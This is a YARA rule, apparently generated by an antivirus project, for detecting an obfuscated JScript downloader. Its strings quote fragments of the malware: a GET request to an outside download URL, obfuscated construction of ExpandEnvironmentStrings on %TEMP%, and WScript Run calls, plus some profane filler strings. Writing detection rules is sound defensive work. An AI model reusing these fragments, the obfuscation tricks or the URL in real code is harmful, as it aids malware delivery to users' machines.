rule sig_20160428_2330f57c878c7ffbb9d016f4b5ac834a {
  meta:
    description = "datamaliciousorder - file 20160428_2330f57c878c7ffbb9d016f4b5ac834a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "db0ef7852ea14ae5a1ddc1a64824eef9a18dcf2dc8cf94e844392be0283a6d35"

  strings:
    $s1  = "IjxMcrFvrPyqQzePffIsa[EehJlpNdpLcoLobChjTff](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function LrbQedAugYnkUlaEthDvv() {return AqvTyyJybJpqSkkKqqBga[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KylZdlHaxPcjYdpVwvNil(BqlXdqUskAwgPhhUbwNin){AqvTyyJybJpqSkkKqqBga[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KylZdlHaxPcjYdpVwvNil(BqlXdqUskAwgPhhUbwNin){AqvTyyJybJpqSkkKqqBga[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function SuxGxaZohUxtGzzBpiJdz(EgkZbtVrhLxvJsyFyxYnu, DhvHpmOkjJftFduXviOqo){NvxSxxAduYvjGnhJgbFfp = NvxSxxAduYvjGnhJgbFfp * 1; " ascii
    $s6  = "var AqvTyyJybJpqSkkKqqBga = function MmgBmuBcyFjlVxlGecXsg() {return IqxDxkIklFidIsqWfkHuv[NylLfdFyoJbgHasCptBrr](\"WScript\"+\"" ascii
    $s7  = "return EgkZbtVrhLxvJsyFyxYnu - DhvHpmOkjJftFduXviOqo;};" fullword ascii
    $s8  = "var AqvTyyJybJpqSkkKqqBga = function MmgBmuBcyFjlVxlGecXsg() {return IqxDxkIklFidIsqWfkHuv[NylLfdFyoJbgHasCptBrr](\"WScript\"+\"" ascii
    $s9  = "var IqxDxkIklFidIsqWfkHuv = this[\"WScript\"];" fullword ascii
    $s10 = "function LrbQedAugYnkUlaEthDvv() {return AqvTyyJybJpqSkkKqqBga[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function SuxGxaZohUxtGzzBpiJdz(EgkZbtVrhLxvJsyFyxYnu, DhvHpmOkjJftFduXviOqo){NvxSxxAduYvjGnhJgbFfp = NvxSxxAduYvjGnhJgbFfp * 1; " ascii
    $s12 = "function XlkXbjQbvIwcJuvJbdQlk(){return UubMpfTqjYrmFduUvbYae + \"\";};" fullword ascii
    $s13 = "if (IjxMcrFvrPyqQzePffIsa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function VnfPjkWjuMkuQlfTabPiy() {return ((LgxUmsWvmEvbCbtSgfVzw == true) && (LgxUmsWvmEvbCbtSgfVzw == XyqJfcJmeOjbVsrZsxYlj)) ?" ascii
    $s15 = "function VnfPjkWjuMkuQlfTabPiy() {return ((LgxUmsWvmEvbCbtSgfVzw == true) && (LgxUmsWvmEvbCbtSgfVzw == XyqJfcJmeOjbVsrZsxYlj)) ?" ascii
    $s16 = "function RvbSecOoyIecRoeBapLlm()" fullword ascii
    $s17 = "function LwgPvoUjbOuyYgcDclWxo(FttBedNwlZsuCwjUzsFhn) {var CbzSagFrtKxcCxxPcwCue = (1, 2, 3, 4, 5, FttBedNwlZsuCwjUzsFhn); retur" ascii
    $s18 = "function KktHmlTuhExzZdmOvtVav(){return 23;};" fullword ascii
    $s19 = "XyqJfcJmeOjbVsrZsxYlj = true; " fullword ascii
    $s20 = "}while (UfoOkdMjvCdkUkeQuwMpc);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}